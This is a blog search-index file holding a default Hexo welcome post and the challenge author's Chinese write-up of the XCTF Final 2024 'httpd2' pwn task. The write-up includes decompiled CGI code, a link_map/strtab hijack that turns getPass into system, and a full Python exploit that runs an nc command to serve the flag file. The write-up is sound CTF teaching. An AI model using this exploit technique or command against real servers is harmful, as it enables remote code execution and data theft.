[{"title":"Hello World","url":"/2024/07/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"XCTF FINAL 2024 httpd2 writeup","url":"/2024/07/17/xctf-final-2024-httpd2-wp/","content":"\n之前给xctf final出了一题pwn，这里分享一下解题思路。\n附件：httpd2.zip\n\n题目逻辑题目本身是一个apache服务器，实现了一个CGI main.cgi。main.cgi实现了简单的登陆逻辑。\n程序首先会初始化参数。sub_1429中，首先获取Content-Length，再申请Content-Length+8的空间，之后每次循环读取0x400个字节直到读取完毕。\n读完后的逻辑是对content进行urldecode的操作，在遇到&amp;时把下一个参数的指针保存到全局数组qword_40C0中\n__int64 sub_1429()&#123;  if ( dword_140D0 != 1 )    goto LABEL_36;  nptr = getenv(&quot;CONTENT_LENGTH&quot;);  if ( nptr )  &#123;    v7 = strtol(nptr, 0LL, 10);    size = v7 + 8;    qword_140D8 = v7;    if ( v7 &gt; 0x8000000 )      return 0xFFFFFFFFLL;  &#125;  else  &#123;    v7 = 4096LL;    size = 4104LL;    qword_140D8 = 4096LL;  &#125;  ptr = (char *)malloc(size);  if ( !ptr )  &#123;LABEL_36:    if ( ptr )      free(ptr);    return 0xFFFFFFFFLL;  &#125;  qword_140E0 = (__int64)malloc(size);  if ( !qword_140E0 )    return 0xFFFFFFFFLL;  v13 = qword_140D8;  v8 = 0LL;  while ( 1 )  &#123;    v4 = read(0, &amp;ptr[v8], 0x400uLL);    if ( !v4 )      break;    if ( v4 &lt; 0 )      return 0xFFFFFFFFLL;    v8 += v4;    if ( v8 &gt; v13 )      return 0xFFFFFFFFLL;  &#125;  ptr[v13] = 0;  v9 = ptr;  v14 = qword_140E0;  v1 = *ptr;  v10 = 0LL;  v11 = 0LL;  qword_40C0[0] = qword_140E0;  if ( !*ptr || !v7 )  &#123;    qword_140C0 = 0LL;    goto LABEL_18;  &#125;  while ( 1 )  &#123;    if ( v1 == 43 )    &#123;      *(_BYTE *)(v14 + v10) = 32;      goto LABEL_32;    &#125;    if ( v1 &gt; 43 )      goto LABEL_31;    if ( v1 == 37 )    &#123;      v2 = sub_13D6(v9[1]);      v3 = sub_13D6(v9[2]);      if ( v2 == -1 || v3 == -1 )      &#123;        *(_BYTE *)(v10 + v14) = v1;      &#125;      else      &#123;        *(_BYTE *)(v14 + v10) = v3 | (16 * v2);        v9 += 2;      &#125;      goto LABEL_32;    &#125;    if ( v1 != &#x27;&amp;&#x27; )    &#123;LABEL_31:      *(_BYTE *)(v10 + v14) = v1;      goto LABEL_32;    &#125;    *(_BYTE *)(v14 + v10) = 0;    qword_140C0 = ++v11;    if ( v11 != 0x2000 )    &#123;      qword_40C0[v11] = v10 + 1 + v14;      if ( !v9[1] )        break;    &#125;LABEL_32:    if ( !v1 )      break;    ++v10;    if ( ++v9 &gt;= &amp;ptr[v13] )      break;    v1 = *v9;  &#125;  *(_BYTE *)(v14 + v10 + 1) = 0;LABEL_18:  free(ptr);  return 0LL;&#125;\n\nmain函数中获取userame和passwd参数，传入libctfc的checkLogin验证。\ncheckLogin根据passwd生成cookie，再根据username获取对应passwd与输入的参数比较。密码正确就会设置Set-Cookie字段。\n漏洞题目本身有2个漏洞。\n一是全局数组qword_40C0在存指针时没有有效判断边界，index大于0x2000之后没有退出循环，导致可以越界写指针。\nif ( v11 != 0x2000 )&#123;  qword_40C0[v11] = v10 + 1 + v14;  if ( !v9[1] )    break;&#125;\n\n\n\n二是在genCookie中，未检查输入的密码的长度，密码是可控的，导致越界写0。\nv4 = strlen(a1);sub_135A(dest, 0x400uLL, a1, v4 + 1);dest[v4] = 0;sprintf(src, &quot;:%lx&quot;, buf);strncat(dest, src, 0x400uLL);return dest;\n\n只有第2个可以利用。\n调试apache在接收到请求时会fork子进程去运行对应的CGI，所以实际要调试的是子进程。\n首先attach用户为www的进程（gdb附加上去后会停在accept，否则就是附加错进程）\n\n在fork下断点，发包，程序断在fork，输入\nset follow-fork-mode childcatch execc\n\n之后gdb进入子进程main.cgi的__start处就可以调试了。\n利用修改link_map的l_info[DT_STRTAB]，劫持_dl_runtime_resolve流程，执行任意函数。\n_dl_runtime_resolve根据glibc/elf/dl-runtime.c源码，ld在解析函数地址时首先从link_map中获取符号表（symtab）和字符串表（strtab），根据偏移从符号表获取对应表项，表项中的st_name是这个符号名称在字符串表中的偏移，之后将strtab + sym-&gt;st_name传入_dl_lookup_symbol_x查找函数地址。如果我们能够最终修改传给_dl_lookup_symbol_x的参数就能解析任意函数。\n_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */...      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);...  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125;\n\n\n\n修改strtab分析源码可知，我们可以修改symtab和strtab，strtab存放的是字符串，伪造起来更方便，所以选择伪造strtab。\nl_info[DT_STRTAB]结构体如下，\ntypedef struct&#123;  Elf64_Sxword\td_tag;\t\t\t/* Dynamic entry type */  union    &#123;      Elf64_Xword d_val;\t\t/* Integer value */      Elf64_Addr d_ptr;\t\t\t/* Address value */    &#125; d_un;&#125; Elf64_Dyn;\n\n通过调试也可以看到，l_info[DT_STRTAB]在link_map+0x68处，指向的内存先是一个整数5，之后是一个地址0x7f7560b5d408，该地址指向一个字符串，这个字符串就是strtab。\n\n越界写0的漏洞只能修改0x7fb7407f3ea0这个地址，为了能劫持0x7fb7407f0408，我们需要把0x7fb7407f3ea0指向一个位置，这个位置存放着指向可控内容的指针。\n正好程序在初始化时会把content中的每个键值对保存全局数组qword_40C0中，例如content是\na=b&amp;a=c&amp;a=d&amp;a=e&amp;a=f\n\n内存布局是\n\n所以我们需要让0x7fb7407f0408指向全局数组qword_40C0。\n地址计算首先需要计算溢出的缓冲区到link_map+0x68的偏移。\n为了能够解析任意函数，我们需要找一个在利用漏洞之后还未解析的且第一个参数可控的函数（system第一个参数），越界写0之后未解析的函数只有一个getPass在libctf.so中，我们可以查看libctf.so的内存布局，\n\n0x7f148fd5e1e0就是libctf.so的link_map的地址，计算全局变量dest到0x7f148fd5e1e0+0x68偏移得到0x125f48。因为我们只能改一个0，所以只能把第三个字节改成0，偏移加上2得到0x125f4a。\n低12位的地址不会随ASLR变化，l-&gt;l_info[DT_STRTAB]的低12位是0xea0，为了保证命中，需要在qword_40C0中布局，使0x*ea0+8（+8是因为l-&gt;l_info[DT_STRTAB]指向的内存第一个是一个整数，第二个才是strtab指针）的位置放置伪造的strtab。\n伪造的strtab中，可以复制一份libctf.so原来的strtab，把其中的getPass改成system，同时保证其他字符串偏移与原来相同。\nexpexp中构造指针数组时我是&amp;0xffff保证低16位相同，实际只要&amp;0x0fff保证低12位就行。\n题目给了两个端口，可以执行命令后用nc把flag读到另一个端口。\nimport requestsip = &quot;127.0.0.1&quot;port = 8888overflow_start_addr =  0x7fbfd7002000 +0x14300link_map_0x68 = 0x7fbfd713c248ptr_arr_addr =  0x7fbfd7002000  + 0x40C0real_strtab_addr = 0x7fbfd701aea0# set least 3 byte to 0strtab_pad = link_map_0x68 - overflow_start_addr + 2fake_strtab = &quot;%00__gmon_start__%00_ITM_deregisterTMCloneTable%00_ITM_registerTMCloneTable%00__cxa_finalize%00checkLogin%00genCookie%00getPass%00strcmp%00printf%00libctfc.so%00libc.so.6%00GLIBC_2.2.5%00%00&quot;fake_strtab = fake_strtab.replace(&quot;%00getPass%00&quot;, &quot;%00system%00&quot;.ljust(len(&quot;%00getPass%00&quot;),&#x27;a&#x27;))def cons_ptr_arr():\tleast_2_bytes = real_strtab_addr&amp;0xffff\tre = &quot;&quot;\toffset = ptr_arr_addr\tfor i in range(0x2000):\t\tif (offset-8)&amp;0xffff == least_2_bytes:\t\t\tre += fake_strtab\t\t\tbreak\t\telse:\t\t\tre +=&quot;a=b&quot;\t\toffset += 8\t\tre += &#x27;&amp;&#x27;\treturn redef send_req(data):\turl = f&quot;http://&#123;ip&#125;:&#123;port&#125;/cgi-bin/main.cgi&quot;\tdata_len = len(data)\theaders = &#123;\t\t&quot;Host&quot;: f&quot;&#123;ip&#125;&quot;,\t\t&quot;Pragma&quot;: &quot;no-cache&quot;,\t\t&quot;Cache-Control&quot;: &quot;no-cache&quot;,\t\t&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,\t\t&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0&quot;,\t\t&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,\t\t&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,\t\t&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;,\t\t&quot;Connection&quot;: &quot;close&quot;,\t\t&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;,\t\t&quot;Content-Length&quot;: f&quot;&#123;data_len&#125;&quot;,\t&#125;\tresponse = requests.post(url, data = data)\tprint(response.text)data = cons_ptr_arr()cmd = &quot;nc -lvp 8888 &lt; ../flag&quot;data += f&quot;&amp;username=&#123;cmd&#125;&amp;passwd=&#123;&#x27;a&#x27;*strtab_pad&#125;&amp;a=b&quot;i = 0while True:\ti+=1\tprint(i)\tsend_req(data)\n\n\n\n总结出题时没有把代码写的很复杂，目的是让选手专注在漏洞利用上。不能用的洞在比赛前一天才发现，不过不影响题目也就没有改。\n题目漏洞不难发现，利用时一个要是想到打link_map，一个是把l_info[DT_STRTAB]指向全局数组。最后0解有点意外，可能时间太少大佬又去打google ctf了吧。\n"}]